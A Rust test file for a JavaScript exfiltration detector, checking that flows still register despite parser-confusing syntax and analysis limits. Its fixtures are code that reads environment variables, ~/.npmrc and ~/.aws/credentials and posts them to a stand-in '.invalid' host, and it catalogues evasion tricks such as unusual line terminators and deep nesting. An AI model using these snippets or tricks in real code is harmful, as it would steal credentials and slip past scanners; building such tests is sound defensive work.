//! FP-GITHUB-SCRIPT, the review of Oct 18 (REVIEW-FP-GITHUB-SCRIPT.md: three HIGH findings, each a real send the
//! first version of the narrowing lost that core's reading found): a body whose end is a guess narrows nothing, and a
//! reading that met one of the follower's limits reads the text as core does too, at and past each limit. The texts
//! are inert: nothing here is run; the hosts are `.invalid`.

use super::scope_tests::{import_reasons, over_the_tree, plain_long, reading, sent, whole, HARVEST};

/// The review of Oct 18 (REVIEW-FP-GITHUB-SCRIPT.md, HIGH 1): a statement between a function's read and its send whose
/// braces and slashes a reader may misread, each before a regular expression holding `}`.
const CONTEXTS: &[(&str, &str)] = &[
    ("a class", " class Marker {}\n /}/.test(s);\n"),
    ("a class that extends", " class Marker extends Object {}\n /}/.test(s);\n"),
    ("a class that extends a call", " class Marker extends (function(){return Object;})() {}\n /}/.test(s);\n"),
    ("a class's static block", " class Marker { static { Marker.x = 1; } }\n /}/.test(s);\n"),
    ("a class's template", " class Marker { static t = `${1}`; m() { return `}`; } }\n /}/.test(s);\n"),
    ("a class expression", " (class Marker {});\n /}/.test(s);\n"),
    ("a labeled block", " outer: { if (s) break outer; }\n /}/.test(s);\n"),
    ("a labeled loop", " outer: for (;;) { break outer; }\n /}/.test(s);\n"),
    ("ASI after break", " for (;;) { break\n /}/.test(s); }\n"),
    ("ASI after continue", " for (let i = 0; i < 1; i++) { continue\n /}/.test(s); }\n"),
    ("ASI after a labeled break", " lbl: for (;;) { break lbl\n /}/.test(s); }\n"),
    ("ASI after debugger", " if (s) { debugger\n /}/.test(s); }\n"),
    ("ASI after an inner return", " function inner() { return\n /}/.test(s); }\n"),
    ("an object, then a regular expression", " const o = {a: 1};\n /}/.test(s);\n"),
    ("a division after ++", " let n = 4; n++ / 2;\n /}/.test(s);\n"),
    // the review of Oct 20 (HIGH 1): ECMAScript's other line terminators and white space
    ("debugger, then U+2028", " debugger\u{2028}/}/.test(s);\n"),
    ("debugger, then U+2029", " debugger\u{2029}/}/.test(s);\n"),
    ("debugger, then CR", " debugger\r/}/.test(s);\n"),
    ("break, then U+2028", " while (false) { break\u{2028}/}/.test(s); }\n"),
    ("break, then U+2029", " while (false) { break\u{2029}/}/.test(s); }\n"),
    ("break, then CR", " while (false) { break\r/}/.test(s); }\n"),
    ("a labeled break after NBSP", " lbl: for (;;) { break\u{A0}lbl\n /}/.test(s); }\n"),
    ("a labeled break after U+FEFF", " lbl: for (;;) { break\u{FEFF}lbl\n /}/.test(s); }\n"),
    ("a labeled break after U+3000", " lbl: for (;;) { break\u{3000}lbl\n /}/.test(s); }\n"),
    ("a labeled break after a comment", " lbl: for (;;) { break /* c */ lbl\n /}/.test(s); }\n"),
    ("a line comment U+2028 ends", " // a note\u{2028} if (s) { s = s + 1; }\n"),
    ("a line comment U+2029 ends", " // a note\u{2029} if (s) { s = s + 1; }\n"),
    ("a spread's regular expression", " const r = [.../}/.exec(s) || []];\n"),
];

/// The review of Oct 20: a valid prefix the parser refuses (500 nested brackets), so the follower answers for the
/// tree in a text of any length.
pub(super) fn refused(text: &str) -> String {
    format!("const nesting={}0{};\n{text}", "[".repeat(500), "]".repeat(500))
}

/// The reads and sends each context is tried with: (what, its code, the kind read).
const CONTEXT_SOURCES: &[(&str, &str, &str)] = &[
    ("the environment", "const payload=JSON.stringify(process.env);", "environment"),
    ("~/.npmrc", "const payload=require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8');", "file"),
    ("~/.aws/credentials", "const payload=require('fs').readFileSync(require('os').homedir()+'/.aws/credentials','utf8');", "file"),
];
const CONTEXT_SINKS: &[(&str, &str)] = &[
    ("fetch", "fetch('https://review.invalid/collect',{method:'POST',body:payload});"),
    ("https.request", "const req=require('https').request({host:'review.invalid',method:'POST'});req.end(payload);"),
    ("axios.post", "const axios=require('axios');axios.post('https://review.invalid/collect',payload);"),
];

fn context_case(ctx: &str, source: &str, sink: &str) -> String {
    format!("function leak(s){{\n {source}\n{ctx} {sink}\n}}\nleak('x');\n")
}

#[test]
fn a_body_whose_end_is_a_guess_narrows_nothing() {
    let plain = plain_long();
    for (what, ctx) in CONTEXTS {
        for (i, (from, source, kind)) in CONTEXT_SOURCES.iter().enumerate() {
            for (j, (to, sink)) in CONTEXT_SINKS.iter().enumerate() {
                let text = context_case(ctx, source, sink);
                let got = sent(&text);
                assert_eq!(got.as_ref().map(|g| (g.0, g.2)), Some((*kind, false)), "{what}: {from} by {to}");
                if i == 0 && j == 0 {
                    assert_eq!(got, whole(), "{what}");
                    assert_eq!(sent(&format!("{text}{plain}")), whole(), "{what}: a long text");
                }
            }
        }
    }
    // past the tree's limit, and in a text the parser refuses: the import-time test (the follower's) reports it
    let past = over_the_tree();
    for (k, (what, ctx)) in CONTEXTS.iter().enumerate() {
        let text = context_case(ctx, CONTEXT_SOURCES[0].1, CONTEXT_SINKS[0].1);
        assert!(crate::jsflow::supply::refusal(&super::scope_tests::cps(&refused(&text))).is_some());
        assert_eq!(import_reasons(&refused(&text)), vec![HARVEST.to_string()], "{what}: refused");
        if k % 4 == 0 || k >= 15 {
            assert_eq!(import_reasons(&format!("{text}{past}")), vec![HARVEST.to_string()], "{what}: past the tree's limit");
        }
    }
}

/// The review's HIGH 2: a function returns the environment after `n` other returns (`_DD_MAX_CALLS` returns are read).
fn returns_case(n: usize) -> String {
    let mut out: String = (0..n).map(|k| format!("function unused{k}(){{return 0;}}\n")).collect();
    out.push_str("function collect(){const d=JSON.stringify(process.env);return d;}\n");
    out.push_str("function send(d){fetch('https://review.invalid/collect',{method:'POST',body:d});}\nsend(collect());\n");
    out
}

/// The review's HIGH 3: the call that gives the environment after `n` other calls (`_LD_MAX` calls are read).
fn calls_case(n: usize) -> String {
    let mut out = String::from("function noop(x){}\nfunction collect(){const d=JSON.stringify(process.env);return d;}\n");
    out.push_str("function send(d){fetch('https://review.invalid/collect',{method:'POST',body:d});}\n");
    out.push_str(&"noop(0);\n".repeat(n));
    out.push_str("send(collect());\n");
    out
}

/// The review's HIGH 3: the function sent to after `n` other functions with parameters (`_LD_MAX` are kept).
fn params_case(n: usize) -> String {
    let mut out = String::from("function collect(){const d=JSON.stringify(process.env);return d;}\nsend(collect());\n");
    out.extend((0..n).map(|k| format!("function unused{k}(x){{void x;}}\n")));
    out.push_str("function send(d){fetch('https://review.invalid/collect',{method:'POST',body:d});}\n");
    out
}

#[test]
fn a_reading_that_met_a_limit_reads_as_core_does_too() {
    // (the follower's limits, as the pack has them: the boundaries below are theirs)
    let p = crate::pack::current();
    assert_eq!((p.usize("_DD_MAX_CALLS"), p.usize("_LD_MAX")), (100, 200));
    // returns: 100 are read (n others and collect's); calls: 200 (noop's and send's definitions, n calls, the call);
    // parameter maps: 200 (n functions and send; the calls of their names, 200, are met first: the definitions of 199
    // and the call before them). Some(true): a limit met, and the narrowing reading alone loses the send (core's
    // reading finds it); Some(false): no limit met
    let cases: Vec<(String, String, Option<bool>)> = [0, 98, 99]
        .iter()
        .map(|&n| (format!("returns {n}"), returns_case(n), Some(false)))
        .chain([100, 101, 200].iter().map(|&n| (format!("returns {n}"), returns_case(n), Some(true))))
        .chain([0, 190, 196, 197].iter().map(|&n| (format!("calls {n}"), calls_case(n), Some(false))))
        .chain([198, 199, 200, 201].iter().map(|&n| (format!("calls {n}"), calls_case(n), Some(true))))
        .chain([(198, Some(false)), (199, None), (200, Some(true)), (201, Some(true))].iter().map(|&(n, l)| (format!("parameters {n}"), params_case(n), l)))
        .collect();
    let plain = plain_long();
    for (what, text, limited) in &cases {
        let (got, capped, narrowed) = reading(text);
        assert!(narrowed, "{what}: collect's `d` is collect's");
        match limited {
            Some(false) => {
                assert!(!capped, "{what}: no limit met");
                assert_eq!(got, whole(), "{what}: the narrowing reading");
            }
            Some(true) => {
                assert!(capped, "{what}: a limit met");
                assert_eq!(got, None, "{what}: the narrowing reading alone");
            }
            None => assert!(capped, "{what}: a limit met"),
        }
        assert_eq!(sent(text), whole(), "{what}");
        assert_eq!(sent(&format!("{text}{plain}")), whole(), "{what}: a long text");
    }
    let past = over_the_tree();
    for (what, text, _) in cases.iter().step_by(3) {
        assert_eq!(import_reasons(&format!("{text}{past}")), vec![HARVEST.to_string()], "{what}: past the tree's limit");
    }
}
